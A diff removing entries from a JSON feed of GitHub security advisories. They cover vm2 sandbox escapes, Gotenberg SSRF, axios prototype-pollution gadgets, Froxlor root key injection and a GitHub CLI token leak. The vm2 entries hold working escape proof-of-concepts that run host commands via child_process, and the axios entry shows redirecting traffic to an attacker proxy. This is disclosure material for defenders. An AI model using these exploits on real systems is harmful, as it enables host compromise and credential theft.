confirms the intended restrictions work then bypasses them:\n\n```text\nrequire(\"_http_client\").ClientRequest(...)\n```\n\nThis performs ",
-      "link": "https://github.com/advisories/GHSA-r9pm-gxmw-wv6p",
-      "published": "2026-05-29T18:08:06Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47139"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47210",
-      "title": "vm2 sandbox escape via JSPI-backed Promise `.finally()` species bypass",
-      "summary": "### Summary\nA sandbox escape vulnerability in `vm2` allows arbitrary code execution in the host process when untrusted code is executed with async support on runtimes exposing WebAssembly JSPI (`WebAssembly.promising` / `WebAssembly.Suspending`). In the tested configuration, a JSPI-backed Promise can reach `Promise.prototype.finally()` in a way that bypasses the expected Promise-species hardening and exposes a host-originated rejection object to attacker-controlled species logic, breaking the sandbox boundary.\n\nThis is a critical sandbox escape: any application that treats `vm2` as a security boundary may be fully compromised.\n\n### Details\n\nOn node26, JSPI-backed Promises created through `WebAssembly.promising(...)` do not behave like ordinary sandbox Promises.\n\nThat path yields a host-originated `TypeError` during JSPI processing. Inside attacker-controlled species logic reached through `.finally()`, the rejection object exposes a usable host constructor chain. In the tested environment, the rejection object's constructor path can be used to reach host `process`, which leads to arbitrary code execution in the host process.\n\nThis behavior is specific to the JSPI / `.finally()` interaction. In contrast, the corresponding `then` / `catch` paths still appeared to route through `vm2`'s expected `localPromise` machinery in my testing.\n\n### PoC\nEnvironment: node:26-bookworm\n```javascript\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\n(()=>{let b=Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);WebAssembly.instantiate(b,{m:{f:new WebAssembly.Suspending(()=>WebAssembly.compileStreaming(Promise.resolve(0)))}}).then(r=>{let p=WebAssembly.promising(r.instance.exports.run)();class F{constructor(x){this.s=0;this.q=[];x(v=>{this.s=1;this.v=v;for(let i of this.q)if(i[0])i[0](v)},e=>{\n    let P=e.constructor.constructor('return process')()\n    P.mainModule.require('child_process').execS",
-      "link": "https://github.com/advisories/GHSA-6j2x-vhqr-qr7q",
-      "published": "2026-05-29T17:51:05Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47210"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47208",
-      "title": "vm2 is Vulnerable to Sandbox Breakout Through Promise Species",
-      "summary": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nThe `localPromise` constructor was changed to call `this.then(undefined, eater)` to ensure a rejected promise is always used. However, this is missing a call to `resetPromiseSpecies` to ensure that `this` has no special species. Since the species can be changed a custom promise can be used to supply a custom reject method to the executor allowing to get a raw host error and escape the sandbox.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nvm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d > 0) so(d-1);\n\tconst e = new E();\n\te.stack;\n\tthrow e;\n}\nlet ex, ct;\nclass FakePromise extends Promise {\n\tstatic get [Symbol.species](){return ct;}\n}\nfunction doCatch(f) {\n\tex=undefined;\n\tconst p=Promise.withResolvers();\n\tct = function(e){e(f, v=>{ex=v;p.resolve();})};\n\tnew FakePromise(r=>r());\n\treturn p.promise;\n}\n(async function f(s) {\n\tlet min = s;\n\tlet max = 100000;\n\twhile (min<max) {\n\t\tconst mid = (min+max)>>1;\n\t\tawait doCatch(()=>so(mid));\n\t\tif (ex.name===\"RangeError\" && !(ex instanceof RangeError)) {\n\t\t\tex.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\t\t}\n\t\tif (ex instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t}\n\t}\n\tf(s+1);\n})(0);\n`);\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.",
-      "link": "https://github.com/advisories/GHSA-76w7-j9cq-rx2j",
-      "published": "2026-05-29T17:40:15Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47208"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45741",
-      "title": "Gotenberg has an SSRF deny-list bypass in IsPublicIP via IPv6 6to4 / NAT64 / site-local prefixes",
-      "summary": "### Summary\n\n`IsPublicIP` in `pkg/gotenberg/outbound.go` incorrectly classifies IPv6 6to4 / NAT64 / deprecated site-local addresses as public IPs, allowing an unauthenticated attacker to reach internal destinations (e.g., cloud metadata services at `169.254.169.254`) via a single crafted DNS AAAA record. This is a variant of CVE-2026-44430 (modelcontextprotocol/registry).\n\n### Details\n\n`IsPublicIP` uses Go stdlib helpers (`IsLoopback`, `IsPrivate`, `IsLinkLocalUnicast`, etc.) to block internal IPs. However, these helpers do not recognize IPv6 prefixes that embed IPv4 addresses:\n\n| Prefix | RFC | Tunnels to |\n|--------|-----|-----------|\n| `2002::/16` | RFC 3056 (6to4) | IPv4 in bits 16-47 |\n| `64:ff9b::/96` | RFC 6052 (NAT64 well-known) | IPv4 in low 32 bits |\n| `64:ff9b:1::/48` | RFC 8215 (NAT64 local-use) | IPv4 in low 32 bits |\n| `fec0::/10` | RFC 3879 (deprecated site-local) | internal routing |\n\n`addr.Unmap()` only handles `::ffff:0:0/96` (IPv4-mapped) and has no effect on these prefixes. On dual-stack or NAT64-enabled cloud hosts, the OS kernel transparently routes these addresses to their embedded internal IPv4 destinations.\n\nVulnerable code (`pkg/gotenberg/outbound.go` L53-69, commit `93d0103`):\n\n```go\nfunc IsPublicIP(addr netip.Addr) bool {\n    addr = addr.Unmap() // only handles ::ffff:x.x.x.x\n    switch {\n    case addr.IsLoopback(), addr.IsPrivate(),\n         addr.IsLinkLocalUnicast(), ...:\n        return false\n    }\n    return true // 6to4/NAT64/site-local incorrectly reaches here\n}\n```\n\n### PoC\n```\ncd poc/\n./build.sh   # docker build (~30s)\n./run.sh     # docker run \u2014 exits with code 1 (bug detected)\n```\n\nExpected output: `IsPublicIP(2002:a9fe:a9fe::) = true` \u2014 the function returns true for 3 addresses that wrap 169.254.169.254 (AWS IMDS). Full test file available via GHSA private comment on request.\n\n### Impact\n\nAn unauthenticated attacker controlling a DNS AAAA record can tunnel gotenberg's outbound HTTP client to AWS/GCP/Azure IMDS (169.254.169.254),",
-      "link": "https://github.com/advisories/GHSA-86m8-88fq-xfxp",
-      "published": "2026-05-29T16:50:37Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45741"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-44495",
-      "title": "axios Vulnerable to Credential Theft and Response Hijacking via Prototype Pollution Gadget in Config Merge",
-      "summary": "## Summary\n\nAxios versions before the fixed releases contain prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted `Object.prototype.transformResponse`, affected Axios versions may treat that inherited value as request configuration or as an option validator.\n\nAxios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over `Object.prototype` before Axios creates a request.\n\n## Impact\nFor ordinary prototype-pollution primitives that can only assign JSON-like values, this issue primarily results in request failures or denial-of-service attacks.\n\nIf the attacker can pollute `Object.prototype.transformResponse` with a function, affected versions of Axios may execute it. In fully affected versions, the function can observe response data and request config, including URL, headers, and `auth`, and can change the response data returned to application code.\n\nThis function-valued condition is important. Most query-string or JSON parser prototype-pollution bugs cannot create JavaScript functions on their own, so credential exposure and response tampering are conditional rather than automatic consequences of such bugs.\n\n## Affected Functionality\nThe affected functionality is Axios request config processing and response transformation.\n\nAffected use requires all of the following:\n- An affected Axios version.\n- A polluted `Object.prototype` in the same process or browser context.\n- Pollution before Axios merges or validates the request config.\n- A polluted key relevant to Axios config, especially `transformResponse`.\n\nThis is not specific to the Node HTTP adapter. Browser and Node usage can both pass through the shared config/transform pipeline, though real-world exploitability depends on the surrounding application and any helper vulnerabilities.\n\n## Technical Details\nIn affected versions, `mergeConfig()` ",
-      "link": "https://github.com/advisories/GHSA-3g43-6gmg-66jw",
-      "published": "2026-05-29T16:07:31Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-44495"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-44494",
-      "title": "axios Vulnerable to Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`",
-      "summary": "# Vulnerability Disclosure: Full Man-in-the-Middle via Prototype Pollution Gadget in `config.proxy`\n\n## Summary\n\nThe Axios library is vulnerable to a Prototype Pollution \"Gadget\" attack that allows any `Object.prototype` pollution in the application's dependency tree to be escalated into a **full Man-in-the-Middle (MITM) attack** \u2014 intercepting, reading, and modifying all HTTP traffic including authentication credentials.\n\nThe HTTP adapter at `lib/adapters/http.js:670` reads `config.proxy` via standard property access, which traverses the prototype chain. Because `proxy` is **not present in Axios defaults**, the merged config object has no own `proxy` property, making it trivially injectable via prototype pollution. Once injected, `setProxy()` routes **all** HTTP requests through the attacker's proxy server.\n\nUnlike the `transformResponse` gadget (which is constrained by `assertOptions` to return `true`), the proxy gadget has **zero constraints** \u2014 the attacker gets a full MITM position with the ability to read all credentials and tamper with all responses.\n\n**Severity:** Critical (CVSS 9.4)\n**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)\n**Vulnerable Component:** `lib/adapters/http.js` (config property access on merged object)\n\n## CWE\n\n- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\n- **CWE-441:** Unintended Proxy or Intermediary ('Confused Deputy')\n\n## CVSS 3.1\n\n**Score: 9.4 (Critical)**\n\nVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`\n\n| Metric | Value | Justification |\n|---|---|---|\n| Attack Vector | Network | PP is triggered remotely via any vulnerable dependency |\n| Attack Complexity | Low | Once PP exists, single property assignment: `Object.prototype.proxy = {host:'attacker', port:8080}`. Consistent with GHSA-fvcv-3m26-pcqx scoring methodology |\n| Privileges Required | None | No authentication needed |\n| User Interaction | None | No user interaction required |\n| Scope | Unch",
-      "link": "https://github.com/advisories/GHSA-35jp-ww65-95wh",
-      "published": "2026-05-29T16:04:00Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-44494"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-41236",
-      "title": "Froxlor has privilege escalation in SSH key synchronization via symlinked `authorized_keys` path",
-      "summary": "### Summary\nFroxlor 2.3.6 contains a symlink-following flaw in the root-owned SSH key synchronization path used for customer FTP users. The provisioning code appends public keys to `~/.ssh/authorized_keys` under a customer-controlled home directory without verifying that the target path is not a symbolic link.\n\nIf an attacker controls a shell-enabled customer account and can modify files inside the assigned home directory, the attacker can replace `~/.ssh/authorized_keys` with a symlink to `/root/.ssh/authorized_keys`. When Froxlor's privileged cron task later synchronizes SSH keys, it appends the attacker-supplied key into root's authorized key file, resulting in root SSH access.\n\n### Details\nThe customer-facing SSH key workflow accepts an FTP user selection and an arbitrary public key from the authenticated session and forwards them into `SshKeys::add()`:\n\n```php\n// customer_ftp.php:251-253\nif ($action == 'add' && Request::post('send') == 'send') {\n    $result = $log->logAction(USR_ACTION, LOG_INFO, \"added SSH-key\");\n    Commands::get()->apiCall('SshKeys.add', Request::postAll());\n}\n```\n\nOn the server side, the add handler stores the public key and schedules an NSS rebuild as long as the customer has shell capability enabled at the customer level:\n\n```php\n// lib/Froxlor/Api/Commands/SshKeys.php:67-70,120-145\nif ($this->getUserDetail('shell_allowed') != '1') {\n    throw new Exception(\"You cannot add SSH keys because shell access is disabled for your account.\");\n}\n\n$ins_stmt = Database::prepare(\"\n    INSERT INTO `\" . TABLE_PANEL_CUSTOMERS_SSH .\"`.\n\");\nSettings::AddTask('rebuildnssusers');\n```\n\nLater, a root-owned cron path enters `SshKeys::generateFiles()` and derives the target path by simple string concatenation:\n\n```php\n// lib/Froxlor/Cron/System/SshKeys.php:52-64\n$sshdir = FileDir::makeCorrectDir($userinfo['homedir'] . '/.ssh');\n$authkeysfile = FileDir::makeCorrectFile($sshdir . '/authorized_keys');\nif (!file_exists($authkeysfile)) {\n    touch($authkeysfile);\n}\n",
-      "link": "https://github.com/advisories/GHSA-mq5v-pxpm-8jw2",
-      "published": "2026-05-29T15:40:23Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-41236"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48501",
-      "title": "GitHub CLI has an incorrect authorization header in API requests to TUF repository mirrors via `gh attestation`, `gh release verify`, and `gh release verify-asset` commands",
-      "summary": "### Summary\n\nGitHub CLI incorrectly includes an authorization header in API requests to TUF repository mirrors via `gh attestation`, `gh release verify`, and `gh release verify-asset` commands.\n\n **Affected users:**\n\n  - Authenticated `github.com` users who previously ran `gh attestation` commands, `gh release verify`, or `gh release verify-asset`: the `github.com` token was included in requests to `tuf-repo.github.com`, a GitHub Pages domain that is not a GitHub API endpoint. All authentication types are affected.\n  - Users with `GH_ENTERPRISE_TOKEN` or `GITHUB_ENTERPRISE_TOKEN` set who previously ran `gh attestation` commands, `gh release verify`, or `gh release verify-asset`: the enterprise token was included in requests to external hosts `tuf-repo-cdn.sigstore.dev` and `tmaproduction.blob.core.windows.net`. These hosts are not operated by GitHub.\n\n### Details\n\nThe CLI uses a shared HTTP client with an authentication layer that automatically attaches tokens to outgoing requests. This layer lacks accurate host detection and can incorrectly attribute the target host, providing it with a token it should never receive.\n\nSpecifically, the host normalization logic collapses any `*.github.com` subdomain to `github.com`, so a request to `tuf-repo.github.com` (a GitHub Pages site, not a GitHub API endpoint) is treated as a request to `github.com` and receives the user's github.com token. For hosts that don't match `github.com` or a known GHES instance at all, the resolver falls back to `GH_ENTERPRISE_TOKEN` if set.\n\nThe `gh attestation`, `gh release verify` and `gh release verify-asset` commands fetch data from several external hosts as part of their normal operation (TUF metadata from `tuf-repo.github.com` and `tuf-repo-cdn.sigstore.dev`, artifact bundles from Azure Blob Storage). Because these requests go through the same authenticated HTTP client, the token is sent to all of them.\n\n### Impact\n\nTokens were transmitted in HTTP headers to the listed hosts during normal `g",
-      "link": "https://github.com/advisories/GHSA-8xvp-7hj6-mcj9",
-      "published": "2026-05-29T15:30:13Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48501"
       ],
       "is_zero_day": false,
       "is_high_severity": true
